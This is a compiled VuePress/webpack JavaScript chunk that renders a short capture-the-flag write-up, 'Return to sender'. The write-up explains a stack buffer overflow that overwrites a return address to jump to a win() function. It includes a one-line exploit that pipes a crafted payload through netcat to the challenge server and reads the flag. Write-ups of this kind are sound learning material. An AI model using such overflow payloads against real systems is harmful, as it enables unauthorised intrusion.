(window.webpackJsonp=window.webpackJsonp||[]).push([[104],{445:function(t,n,e){"use strict";e.r(n);var s=e(13),a=Object(s.a)({},(function(){var t=this,n=t._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"return-to-sender-write-up"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#return-to-sender-write-up"}},[t._v("#")]),t._v(" Return to sender write-up")]),t._v(" "),n("p",[t._v("Looking at the C file, we know that the "),n("code",[t._v("vuln()")]),t._v(" function doesn't handle our oversized input correctly, allowing us to write to the stack and change the return address of our function.\nUsing OBJDUMP, the address of the "),n("code",[t._v("win()")]),t._v(" function can be found. Next I need to attach a shell to that our program doesn't close automatically. Lastly I just tried using both ways of little-endian / big endian and found little endian to work.")]),t._v(" "),n("p",[t._v("The one-liner solution:")]),t._v(" "),n("div",{staticClass:"language-sh extra-class"},[n("pre",{pre:!0,attrs:{class:"language-sh"}},[n("code",[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("python "),n("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'print("a" * 8 + "\\xb6\\x91\\x04\\x08" * 4)\'')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" -"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" pwn.hsctf.com "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1234")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("ls")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" flag\n")])])])])}),[],!1,null,null,null);n.default=a.exports}}]);